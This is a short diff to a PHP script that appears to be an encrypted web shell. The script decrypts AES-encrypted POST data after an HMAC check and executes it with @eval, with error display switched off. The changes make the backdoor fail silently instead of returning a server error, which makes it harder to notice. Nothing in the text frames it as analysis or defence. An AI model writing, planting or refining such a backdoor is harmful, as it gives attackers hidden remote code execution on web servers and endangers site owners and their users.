@@ -4,6 +4,11 @@
 @ini_set('display_errors', '0');
 
 function Decrypt($data) {
+
+    if (!function_exists('openssl_decrypt')) {
+        return "";
+    }
+
     $prefixLen = 68;
     if (strlen($data) <= $prefixLen + 48) {
         return "";
@@ -26,12 +31,16 @@ function Decrypt($data) {
     $tag = substr($encrypted, -32);
     $body = substr($encrypted, 16, -32);
     
+
+    if ($iv === false || $tag === false || $body === false) {
+        return "";
+    }
+    
     $macData = $iv . $body;
     $check = hash_hmac('sha256', $macData, $aesKey, true);
     
     if ($check !== $tag) {
-        header("HTTP/1.1 500 Internal Server Error");
-        exit();
+        return ""; 
     }
     
     return openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
@@ -45,6 +54,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             try {
                 @eval($deMsg);
             } catch (\Throwable $e) {
+
             }
         }
     }
